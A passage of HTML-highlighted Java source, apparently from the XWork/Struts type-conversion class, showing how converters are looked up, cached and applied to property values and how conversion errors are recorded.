        <span class="k">return</span> <span class="n">className</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;-conversion.properties&#34;</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertValue</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span><span class="o">,</span> <span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">Class</span> <span class="n">aClass</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">convertValue</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">o</span><span class="o">,</span> <span class="n">aClass</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">     * Convert value from one form to another.
</span><span class="cm">     * Minimum requirement of arguments:
</span><span class="cm">     * &lt;ul&gt;
</span><span class="cm">     * &lt;li&gt;supplying context, toClass and value&lt;/li&gt;
</span><span class="cm">     * &lt;li&gt;supplying context, target and value.&lt;/li&gt;
</span><span class="cm">     * &lt;/ul&gt;
</span><span class="cm">     *
</span><span class="cm">     * @see TypeConverter#convertValue(java.util.Map, java.lang.Object, java.lang.reflect.Member, java.lang.String, java.lang.Object, java.lang.Class)
</span><span class="cm">     */</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertValue</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span><span class="o">,</span> <span class="n">Object</span> <span class="n">target</span><span class="o">,</span> <span class="n">Member</span> <span class="n">member</span><span class="o">,</span> <span class="n">String</span> <span class="n">property</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">,</span> <span class="n">Class</span> <span class="n">toClass</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">//
</span><span class="c1"></span>        <span class="c1">// Process the conversion using the default mappings, if one exists
</span><span class="c1"></span>        <span class="c1">//
</span><span class="c1"></span>        <span class="n">TypeConverter</span> <span class="n">tc</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">((</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">toClass</span> <span class="o">==</span> <span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">()))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="c1">// allow this method to be called without any context
</span><span class="c1"></span>        <span class="c1">// i.e. it can be called with as little as &#34;Object value&#34; and &#34;Class toClass&#34;
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">target</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>

            <span class="n">Object</span><span class="o">[]</span> <span class="n">classProp</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="c1">// this is to handle weird issues with setValue with a different type
</span><span class="c1"></span>            <span class="k">if</span> <span class="o">((</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">CompoundRoot</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">context</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">classProp</span> <span class="o">=</span> <span class="n">getClassProperty</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">classProp</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">clazz</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">classProp</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
                <span class="n">property</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">classProp</span><span class="o">[</span><span class="n">1</span><span class="o">];</span>
            <span class="o">}</span>

            <span class="n">tc</span> <span class="o">=</span> <span class="o">(</span><span class="n">TypeConverter</span><span class="o">)</span> <span class="n">getConverter</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">property</span><span class="o">);</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;field-level type converter for property [&#34;</span> <span class="o">+</span> <span class="n">property</span> <span class="o">+</span> <span class="s">&#34;] = &#34;</span> <span class="o">+</span> <span class="o">(</span><span class="n">tc</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="s">&#34;none found&#34;</span> <span class="o">:</span> <span class="n">tc</span><span class="o">));</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">tc</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">context</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// ok, let&#39;s see if we can look it up by path as requested in XW-297
</span><span class="c1"></span>            <span class="n">Object</span> <span class="n">lastPropertyPath</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">ReflectionContextState</span><span class="o">.</span><span class="na">CURRENT_PROPERTY_PATH</span><span class="o">);</span>
            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">XWorkConverter</span><span class="o">.</span><span class="na">LAST_BEAN_CLASS_ACCESSED</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">lastPropertyPath</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">path</span> <span class="o">=</span> <span class="n">lastPropertyPath</span> <span class="o">+</span> <span class="s">&#34;.&#34;</span> <span class="o">+</span> <span class="n">property</span><span class="o">;</span>
                <span class="n">tc</span> <span class="o">=</span> <span class="o">(</span><span class="n">TypeConverter</span><span class="o">)</span> <span class="n">getConverter</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">path</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">tc</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">toClass</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!(</span><span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">||</span> <span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">)))</span> <span class="o">{</span>
                <span class="c1">// when converting to a string, use the source target&#39;s class&#39;s converter
</span><span class="c1"></span>                <span class="n">tc</span> <span class="o">=</span> <span class="n">lookup</span><span class="o">(</span><span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="c1">// when converting from a string, use the toClass&#39;s converter
</span><span class="c1"></span>                <span class="n">tc</span> <span class="o">=</span> <span class="n">lookup</span><span class="o">(</span><span class="n">toClass</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;global-level type converter for property [&#34;</span> <span class="o">+</span> <span class="n">property</span> <span class="o">+</span> <span class="s">&#34;] = &#34;</span> <span class="o">+</span> <span class="o">(</span><span class="n">tc</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="s">&#34;none found&#34;</span> <span class="o">:</span> <span class="n">tc</span><span class="o">));</span>
        <span class="o">}</span>


        <span class="k">if</span> <span class="o">(</span><span class="n">tc</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">return</span> <span class="n">tc</span><span class="o">.</span><span class="na">convertValue</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">target</span><span class="o">,</span> <span class="n">member</span><span class="o">,</span> <span class="n">property</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">toClass</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;unable to convert value using type converter [#0]&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">,</span> <span class="n">tc</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
                <span class="n">handleConversionException</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">property</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">target</span><span class="o">);</span>

                <span class="k">return</span> <span class="n">TypeConverter</span><span class="o">.</span><span class="na">NO_CONVERSION_POSSIBLE</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">defaultTypeConverter</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;falling back to default type converter [&#34;</span> <span class="o">+</span> <span class="n">defaultTypeConverter</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                <span class="k">return</span> <span class="n">defaultTypeConverter</span><span class="o">.</span><span class="na">convertValue</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">target</span><span class="o">,</span> <span class="n">member</span><span class="o">,</span> <span class="n">property</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">toClass</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;unable to convert value using type converter [#0]&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">,</span> <span class="n">defaultTypeConverter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
                <span class="n">handleConversionException</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">property</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">target</span><span class="o">);</span>

                <span class="k">return</span> <span class="n">TypeConverter</span><span class="o">.</span><span class="na">NO_CONVERSION_POSSIBLE</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;falling back to Ognl&#39;s default type conversion&#34;</span><span class="o">);</span>
                <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">convertValue</span><span class="o">(</span><span class="n">value</span><span class="o">,</span> <span class="n">toClass</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;unable to convert value using type converter [#0]&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">,</span> <span class="kd">super</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
                <span class="n">handleConversionException</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">property</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">target</span><span class="o">);</span>

                <span class="k">return</span> <span class="n">TypeConverter</span><span class="o">.</span><span class="na">NO_CONVERSION_POSSIBLE</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">     * Looks for a TypeConverter in the default mappings.
</span><span class="cm">     *
</span><span class="cm">     * @param className name of the class the TypeConverter must handle
</span><span class="cm">     * @return a TypeConverter to handle the specified class or null if none can be found
</span><span class="cm">     */</span>
    <span class="kd">public</span> <span class="n">TypeConverter</span> <span class="nf">lookup</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">unknownMappings</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">className</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">defaultMappings</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="n">TypeConverter</span> <span class="n">result</span> <span class="o">=</span> <span class="n">defaultMappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>

        <span class="c1">//Looks for super classes
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="n">clazz</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">().</span><span class="na">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">cnfe</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">//swallow
</span><span class="c1"></span>            <span class="o">}</span>

            <span class="n">result</span> <span class="o">=</span> <span class="n">lookupSuper</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">result</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">//Register now, the next lookup will be faster
</span><span class="c1"></span>                <span class="n">registerConverter</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="c1">// if it isn&#39;t found, never look again (also faster)
</span><span class="c1"></span>                <span class="n">registerConverterNotFound</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">result</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">     * Looks for a TypeConverter in the default mappings.
</span><span class="cm">     *
</span><span class="cm">     * @param clazz the class the TypeConverter must handle
</span><span class="cm">     * @return a TypeConverter to handle the specified class or null if none can be found
</span><span class="cm">     */</span>
    <span class="kd">public</span> <span class="n">TypeConverter</span> <span class="nf">lookup</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">lookup</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="n">Object</span> <span class="nf">getConverter</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">String</span> <span class="n">property</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Property: &#34;</span> <span class="o">+</span> <span class="n">property</span><span class="o">);</span>
            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Class: &#34;</span> <span class="o">+</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="o">}</span>
        <span class="kd">synchronized</span> <span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">((</span><span class="n">property</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">noMapping</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">mapping</span> <span class="o">=</span> <span class="n">mappings</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">mapping</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">mapping</span> <span class="o">=</span> <span class="n">buildConverterMapping</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                        <span class="n">mapping</span> <span class="o">=</span> <span class="n">conditionalReload</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">mapping</span><span class="o">);</span>
                    <span class="o">}</span>

                    <span class="n">Object</span> <span class="n">converter</span> <span class="o">=</span> <span class="n">mapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">property</span><span class="o">);</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">converter</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;converter is null for property &#34;</span> <span class="o">+</span> <span class="n">property</span> <span class="o">+</span> <span class="s">&#34;. Mapping size: &#34;</span> <span class="o">+</span> <span class="n">mapping</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>
                        <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">next</span> <span class="o">:</span> <span class="n">mapping</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span> <span class="o">{</span>
                            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="n">next</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">mapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">next</span><span class="o">));</span>
                        <span class="o">}</span>
                    <span class="o">}</span>
                    <span class="k">return</span> <span class="n">converter</span><span class="o">;</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">noMapping</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">handleConversionException</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span><span class="o">,</span> <span class="n">String</span> <span class="n">property</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">,</span> <span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">context</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">Boolean</span><span class="o">.</span><span class="na">TRUE</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">REPORT_CONVERSION_ERRORS</span><span class="o">))))</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">realProperty</span> <span class="o">=</span> <span class="n">property</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">fullName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">CONVERSION_PROPERTY_FULLNAME</span><span class="o">);</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">fullName</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">realProperty</span> <span class="o">=</span> <span class="n">fullName</span><span class="o">;</span>
            <span class="o">}</span>

            <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">conversionErrors</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">ActionContext</span><span class="o">.</span><span class="na">CONVERSION_ERRORS</span><span class="o">);</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">conversionErrors</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">conversionErrors</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;();</span>
                <span class="n">context</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">ActionContext</span><span class="o">.</span><span class="na">CONVERSION_ERRORS</span><span class="o">,</span> <span class="n">conversionErrors</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="n">conversionErrors</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">realProperty</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">registerConverter</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">TypeConverter</span> <span class="n">converter</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">defaultMappings</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">className</span><span class="o">,</span> <span class="n">converter</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">unknownMappings</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">className</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">unknownMappings</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">registerConverterNotFound</span><span class="o">(</span><span class="n">String</span> <span class="n">className</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">unknownMappings</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="n">Object</span><span class="o">[]</span> <span class="nf">getClassProperty</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Object</span> <span class="n">lastClass</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">LAST_BEAN_CLASS_ACCESSED</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">lastProperty</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">LAST_BEAN_PROPERTY_ACCESSED</span><span class="o">);</span>
        <span class="k">return</span> <span class="o">(</span><span class="n">lastClass</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">lastProperty</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">?</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="n">lastClass</span><span class="o">,</span> <span class="n">lastProperty</span><span class="o">}</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="cm">/**
</span><span class="cm">     * Looks for converter mappings for the specified class and adds it to an existing map.  Only new converters are
</span><span class="cm">     * added.  If a converter is defined on a key that already exists, the converter is ignored.
</span><span class="cm">     *
</span><span class="cm">     * @param mapping an existing map to add new converter mappings to
</span><span class="cm">     * @param clazz   class to look for converter mappings for
</span><span class="cm">     */</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">addConverterMapping</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">mapping</span><span class="o">,</span> <span class="n">Class</span> <span class="n">clazz</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">converterFilename</span> <span class="o">=</span> <span class="n">buildConverterFilename</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
            <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="n">FileManager</span><span class="o">.</span><span class="na">loadFile</span><span class="o">(</span><span class="n">converterFilename</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">is</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">LOG</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;processing conversion file [&#34;</span> <span class="o">+</span> <span class="n">converterFilename</span> <span class="o">+</span> <span class="s">&#34;] [class=&#34;</span> <span class="o">+</span> <span class="n">clazz</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">);</span>
                <span class="o">}</span>

                <span class="n">Properties</span> <span class="n">prop</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Properties</span><span class="o">();</span>
                <span class="n">prop</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>

                <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">prop</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">mapping</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
                        <span class="k">break</span><span class="o">;</span>
                    <span class="o">}</span>
                    <span class="c1">// for keyProperty of Set
